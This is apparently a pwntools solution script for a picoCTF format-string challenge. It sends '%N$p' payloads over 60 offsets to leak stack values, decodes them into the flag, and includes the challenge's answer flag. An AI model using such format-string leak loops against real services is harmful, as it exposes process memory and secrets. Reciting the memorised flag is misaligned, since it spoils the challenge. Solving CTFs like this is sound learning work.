from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

flag = b""
for i in range(int(60)):
    io = start()
    st = f"%{i}$p"
    payload = flat([st.encode()])

    io.sendlineafter(b'', payload)
    print(f"{i}-th iteration:")
    io.recvuntil(b"\n")
    recover = io.recvline()[:-1][2:]
    try:
        flag += unhex(recover)[::-1]
    except:
        pass
print(flag)

"""
Desc:
    I'm just copying and pasting with this program. What can go wrong?
Explanation:
    This is a format strings challenge for leaking a value on stack.
    I solved this using fuzzy techniques, basically trying a range of offsets and appending the hex values to the flag variable then printing the entire variable to see if we got the flag.

    picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
"""